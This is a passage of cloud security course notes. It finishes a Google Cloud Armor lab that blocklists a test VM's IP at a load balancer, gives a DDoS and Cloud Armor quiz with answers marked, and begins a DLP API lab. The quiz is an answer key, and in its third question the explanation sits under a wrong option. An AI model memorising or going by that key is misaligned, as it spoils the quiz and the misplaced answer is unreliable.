referrerpolicy="no-referrer" alt="Navigation menu icon"></p><h4 id='task-1-verify-the-http-load-balancer-is-deployed-2'><span>Task 1. Verify the HTTP load balancer is deployed</span></h4><p><span>In this task, you verify that the global HTTP load balancer is deployed. The HTTP load balancer is automatically created when you start the lab. This will be used for a simple web application. This application is deployed to demonstrate the capabilities of Google Cloud Armor.</span></p><ol start='' ><li><p><span>On the Google Cloud console title bar, click </span><strong><span>Activate Cloud Shell</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D" referrerpolicy="no-referrer" alt="Activate Cloud Shell icon"><span>). If prompted, click </span><strong><span>Continue</span></strong><span>.</span></p></li><li><p><span>Verify that the load balancer is deployed and registered by executing the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute backend-services get-health web-backend --global</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> Rerun this command and wait until this command returns that three instances are HEALTHY. You can also monitor it in the console (</span><strong><span>Navigation menu &gt; View All Products &gt; Network services &gt; Load balancing</span></strong><span>).</span></p><ol start='' ><li><p><span>Retrieve the load balancer IP address by executing the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute forwarding-rules describe web-rule --global</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Copy the value for the </span><strong><span>IPAddress</span></strong><span> property.</span></p></li></ol><p><span>Keep track of this IP address. It will also be used in a later section.</span></p><ol start='' ><li><p><span>Open a new browser tab and try to visit that IP address </span><code>http://{IP_ADDRESS}</code><span>.</span></p></li></ol><p><span>Replace </span><code>{IP_ADDRESS}</code><span> with the IP address of the load balancer. Do not include the curly braces when you are asked to provide the IP address.</span></p><p><span>If you get a message that the IP address doesn&#39;t support a secure connection, click </span><strong><span>Continue to site</span></strong><span>.</span></p><p><span>Keep refreshing the page until you see a page with a message similar to this:</span></p><p><img src="images\TejCgv4DW0Lq%2FQg5JjVV6H4dNY%2FEeZPTWo03qa3reCk%3D" referrerpolicy="no-referrer" alt="Web server notification; the server is in zone X"></p><p><strong><span>Note:</span></strong><span> It might take a couple of minutes to access the HTTP load balancer. In the meantime, you might get 404 or 502 errors. Keep trying until you see the page of one of the backends.</span></p><ol start='' ><li><p><span>In Cloud shell, use the following </span><code>curl</code><span> command to access the IP address:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">while true; do curl -m1 {IP_ADDRESS}; done</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The responses will be from backends that have been created in different zones.</span></p><ol start='' ><li><p><span>Press </span><strong><span>CTRL+C</span></strong><span> to stop the previous command.</span></p></li></ol><h4 id='task-2-create-a-vm-to-test-access-to-the-load-balancer-2'><span>Task 2. Create a VM to test access to the load balancer</span></h4><ol start='' ><li><p><span>Go to </span><strong><span>Navigation menu &gt; Compute Engine</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create Instance</span></strong><span>.</span></p></li><li><p><span>On the </span><strong><span>Machine configuration</span></strong><span> page, enter the following values:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><strong><span>Field</span></strong></th><th style='text-align:left;' ><strong><span>Value</span></strong><span> (type or select)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>access-test</span></td></tr><tr><td style='text-align:left;' ><span>Region</span></td><td style='text-align:left;' ><code>europe-west4</code></td></tr><tr><td style='text-align:left;' ><span>Zone</span></td><td style='text-align:left;' ><code>europe-west4-c</code></td></tr></tbody></table></figure></li><li><p><span>Leave everything else at the default and click </span><strong><span>Create</span></strong><span>.</span></p></li><li><p><span>Once launched, click the </span><strong><span>SSH</span></strong><span> button to connect to the instance.</span></p></li><li><p><span>Run the following command on the instance to access the load balancer:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -m1 {IP_ADDRESS}</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The output should look similar to:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;!doctype html&gt;&lt;html&gt;&lt;body&gt;&lt;h1&gt;Web server&lt;/h1&gt;&lt;h2&gt;This server is in zone: projects/104716457480/zones/europe-west4-c&lt;/h2&gt; &lt;/body&gt;&lt;/html&gt;</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create a VM to test access to the load balancer.</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='task-3-create-a-security-policy-with-google-cloud-armor-2'><span>Task 3. Create a security policy with Google Cloud Armor</span></h4><h5 id='blocklist-the-access-test-vm-2'><span>Blocklist the access-test VM</span></h5><p><strong><span>Note:</span></strong><span> You will now create a security policy to blocklist access to the load balancer from the access-test VM. This policy can be used to block access from a malicious client. There are ways to identify the external IP address of a client trying to access your HTTP load balancer. For example, you could examine traffic captured by VPC Flow Logs in BigQuery to determine a high volume of incoming requests.</span></p><ol start='' ><li><p><span>Go to </span><strong><span>Navigation menu &gt; Compute engine</span></strong><span>, click </span><strong><span>access-test</span></strong><span> VM and scroll down to </span><strong><span>Network interface</span></strong><span> and then copy the </span><strong><span>External IP address</span></strong><span>.</span></p></li><li><p><span>From the </span><strong><span>Navigation menu</span></strong><span> &gt; </span><strong><span>View All Products</span></strong><span>. Go to </span><strong><span>Networking</span></strong><span> section, click </span><strong><span>Network Security</span></strong><span> &gt; </span><strong><span>Cloud Armor policies</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create policy</span></strong><span>.</span></p></li><li><p><span>Provide a name as </span><strong><span>blocklist-access-test</span></strong><span> and set the </span><strong><span>Default rule action</span></strong><span> to </span><strong><span>Allow</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Next step</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Add rule</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p></li></ol><figure class='table-figure'><table><thead><tr><th><strong><span>Property</span></strong></th><th><strong><span>Value</span></strong></th></tr></thead><tbody><tr><td><span>Mode</span></td><td><span>Basic mode (IP addresses/ranges only)</span></td></tr><tr><td><span>Match</span></td><td><span>Enter the External IP of the </span><strong><span>access-test</span></strong><span> VM</span></td></tr><tr><td><span>Action</span></td><td><span>Deny</span></td></tr><tr><td><span>Response code</span></td><td><span>404 (Not Found)</span></td></tr><tr><td><span>Priority</span></td><td><span>1000</span></td></tr></tbody></table></figure><p><strong><span>Note:</span></strong><span> Notice that you are setting the Deny status to 404.</span></p><ol start='' ><li><p><span>Click </span><strong><span>SAVE CHANGE TO RULE</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Next step</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>+ Add Target</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Type 1</span></strong><span>, select </span><strong><span>Backend service (external application load balancer)</span></strong><span>.</span></p></li><li><p><span>For </span><strong><span>Backend Service target 1</span></strong><span>, select </span><strong><span>web-backend</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Next step</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create policy</span></strong><span>.</span></p></li></ol><p><strong><span>Note:</span></strong><span> Alternatively, you could set the default rule to Deny and only allow list traffic from authorized users/IP addresses.</span></p><p><span>Wait for the policy to be created before moving to the next step.</span></p><h5 id='verify-the-security-policy-2'><span>Verify the security policy</span></h5><ol start='' ><li><p><span>Return to the SSH session of the access-test VM.</span></p></li><li><p><span>Run the </span><code>curl</code><span> command again on the instance to access the load balancer:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -m1 {IP_ADDRESS}</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The output should look as follows.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;!doctype html&gt;&lt;meta charset="utf-8"&gt;&lt;meta name=viewport content="width=device-width, initial-scale=1"&gt;&lt;title&gt;404&lt;/title&gt;404 Not Found</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> It might take a couple of minutes for the security policy to take affect. If you are able to access the backends, keep trying until you get the </span><strong><span>404</span></strong><span> Not Found error.</span></p><ol start='' ><li><p><span>Try accessing the load balancer IP from your local browser. You should still be able to access it as we have only blocklisted the access-test VM.</span></p></li></ol><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create a security policy with Google Cloud Armor.</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='task-4-view-google-cloud-armor-logs-2'><span>Task 4. View Google Cloud Armor logs</span></h4><ol start='' ><li><p><span>In the Cloud console, from the </span><strong><span>Navigation menu</span></strong><span> &gt; </span><strong><span>View All Products</span></strong><span>. Go to </span><strong><span>Networking</span></strong><span> section, click </span><strong><span>Network Security</span></strong><span> &gt; </span><strong><span>Cloud Armor policies</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>blocklist-access-test</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Logs</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>View policy logs</span></strong><span> and go to the latest logs. If prompted, close the notification.</span></p></li><li><p><span>Locate a log with a </span><strong><span>404</span></strong><span> and expand the log entry.</span></p></li><li><p><span>Expand </span><strong><span>httpRequest</span></strong><span>.</span></p></li><li><p><span>The request should be from the </span><strong><span>access-test</span></strong><span> VM IP address.</span></p></li><li><p><span>Explore some of the other log entries.</span></p></li></ol><h4 id='congratulations-17'><span>Congratulations!</span></h4><p><span>In this lab, you have done the following:</span></p><ul><li><p><span>Verified that the HTTP load balancer was deployed.</span></p></li><li><p><span>Created a VM to test access to the HTTP load balancer.</span></p></li><li><p><span>Used Google Cloud Armor to blocklist an IP address and restrict access to an HTTP load balancer.</span></p></li></ul><p>&nbsp;</p><h3 id='quiz-23'><span>QUIZ</span></h3><ol start='' ><li><p><span>Choose the FOUR correct DDoS Mitigation Layers from the list below.</span></p></li></ol><ul><li><p><span>Botnet Detection API</span></p></li><li><p><span>Ping Report</span></p></li><li><p><strong><span>CDN Offloading</span></strong></p><p><span>Correct! Offload static content to a CDN to minimize impact.</span></p></li><li><p><strong><span>Attack Surface</span></strong></p><p><span>Correct! Reduce the attack surface by reducing externally facing resources.</span></p></li><li><p><span>Google Cloud Blocklist</span></p></li><li><p><strong><span>Internal Traffic</span></strong></p><p><span>Correct! Isolate internal traffic from the outside world by restricting access.</span></p></li><li><p><strong><span>Load Balancing</span></strong></p><p><span>Correct! Use proxy-based load balancing to distribute load across resources.</span></p></li></ul><ol start='2' ><li><p><span>Which TWO of the following statements is TRUE about Google Cloud Armor?</span></p></li></ol><ul><li><p><span>Google Cloud Armor currently is not compatible with any third-party partner security products.</span></p></li><li><p><strong><span>Google Cloud Armor enforces access control based on IPv4 and IPv6 addresses or CIDRs.</span></strong></p><p><span>Correct! Google Cloud Armor assists you in customizing your defenses and mitigating multi-vector attacks.</span></p></li><li><p><span>Google Cloud Armor is a Ransomware defense service.</span></p></li><li><p><strong><span>Google Cloud Armor protection is delivered at the edge of Google’s network.</span></strong></p><p><span>Correct! In this manner, it functions like a CDN and can block attacks close to their source, before they have a chance to affect your applications.</span></p></li></ul><ol start='3' ><li><p><span>Choose from the list below which way Google Cloud helps mitigate the risk of DDoS for its customers.</span></p></li></ol><ul><li><p><span>Google Cloud firewall rules rate limit the number of requests sent to VMs.</span></p></li><li><p><span>Isolation servers are available with no external or internal access.</span></p></li><li><p><strong><span>Internal capacity many times that of any traffic load we can anticipate.</span></strong></p></li><li><p><span>Google Blocklist API is automatically included within each project.</span></p><p><span>Correct! In fact, a single Google Data Center has a bisection bandwidth of 1,300 terabits per second (the whole internet has a bisection bandwidth of 200 terabits per second!)</span></p></li></ul><p>&nbsp;</p><h2 id='content-related-vulnerabilities-techniques-and-best-practices'><span>Content-Related Vulnerabilities: Techniques and Best Practices</span></h2><h3 id='lab---redacting-sensitive-data-with-the-dlp-api'><span>LAB - Redacting Sensitive Data with the DLP API</span></h3><h4 id='overview-21'><span>Overview</span></h4><p><span>In this lab, you will set up the </span><a href='https://cloud.google.com/dlp/docs#docs'><span>Cloud Data Loss Prevention API (DLP API)</span></a><span> and use the API to inspect a string of data for sensitive information. The DLP API helps you better understand and manage sensitive data.</span></p><p><span>It provides fast, scalable classification and redaction for sensitive data elements like credit card numbers, names, social security numbers, US and selected international identifier numbers, phone numbers and Google Cloud credentials.</span></p><h5 id='objectives-18'><span>Objectives</span></h5><p><span>In this lab, you will learn how to do the following:</span></p><ul><li><p><span>Enable the DLP API.</span></p></li><li><p><span>Install the Node JS DLP API and sample.</span></p></li><li><p><span>Inspect string data for sensitive data.</span></p></li><li><p><span>Redact sensitive data from string data and images.</span></p></li></ul><h4 id='setup-and-requirements-18'><span>Setup and requirements</span></h4><p><span>For each lab, you get a new Google Cloud project and set of resources for a fixed time at no cost.</span></p><ol start='' ><li><p><span>Sign in to Qwiklabs using an </span><strong><span>incognito window</span></strong><span>.</span></p></li><li><p><span>Note the lab&#39;s access time (for example, </span><code>1:15:00</code><span>), and make sure you can finish within that time.</span>
<span>There is no pause feature. You can restart if needed, but you have to start at the beginning.</span></p></li><li><p><span>When ready, click </span><strong><span>Start lab</span></strong><span>.</span></p></li><li><p><span>Note your lab credentials (</span><strong><span>Username</span></strong><span> and </span><strong><span>Password</span></strong><span>). You will use them to sign in to the Google Cloud Console.</span></p></li><li><p><span>Click </span><strong><span>Open Google Console</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Use another account</span></strong><span> and copy/paste credentials for </span><strong><span>this</span></strong><span> lab into the prompts.</span>
<span>If you use other credentials, you&#39;ll receive errors or </span><strong><span>incur charges</span></strong><span>.</span></p></li><li><p><span>Accept the terms and skip the recovery resource page.</span></p></li></ol><p><strong><span>Note:</span></strong><span> Do not click </span><strong><span>End Lab</span></strong><span> unless you have finished the lab or want to restart it. This clears your work and removes the project.</span></p><h4 id='task-1-enable-the-dlp-api'><span>Task 1. Enable the DLP API</span></h4><p><span>In this task, you enable the DLP API through APIs &amp; Services.</span></p><ol start='' ><li><p><span>Go to </span><strong><span>Navigation menu &gt; APIs &amp; Services</span></strong><span>.</span></p></li><li><p><span>Click the </span><strong><span>Enable APIs and Services</span></strong><span> button.</span></p></li><li><p><span>In the </span><strong><span>Search for APIs &amp; Services</span></strong><span> field, enter </span><code>DLP</code><span> and then click on the </span><strong><span>Cloud Data Loss Prevention (DLP) API</span></strong><span> title.</span></p></li></ol><p><img src="images\otwsQGvohnG3pFLCRITjLRpJswBTSdSHBHaBckvzoTw%3D" referrerpolicy="no-referrer" alt="Google Cloud Data Loss Prevention (DLP) API selection"></p><ol start='' ><li><p><span>Click the </span><strong><span>Enable</span></strong><span> button to enable the DLP API. If the API is already enabled, you will see a </span><strong><span>Manage</span></strong><span> button instead, along with an </span><em><span>API enabled</span></em><span> message. In that case you do not need to do anything.</span></p></li></ol><h4 id='task-2-install-the-dlp-api-and-node-js-samples'><span>Task 2. Install the DLP API and Node JS samples</span></h4><p><span>In this task, you download the Node JS DLP API and samples and install the required dependencies.</span></p><ol start='' ><li><p><span>On the Google Cloud Console tile bar, click </span><strong><span>Activate Cloud Shell</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D" referrerpolicy="no-referrer" alt="Activate Cloud Shell icon"><span>) to open Cloud Shell. When prompted, click </span><strong><span>Continue</span></strong><span>. After a moment, in the lower part of the browser window, the Terminal appears.</span></p></li><li><p><span>Run the following command to create the </span><code>GCLOUD_PROJECT</code><span> environment variable and set it to the project ID:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">export GCLOUD_PROJECT=$DEVSHELL_PROJECT_ID</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Run the following command in Cloud Shell to download the Node JS DLP API and samples:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">git clone https://github.com/GoogleCloudPlatform/nodejs-docs-samples</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Once the download is complete, change into the </span><strong><span>nodejs-docs-samples/dlp</span></strong><span> 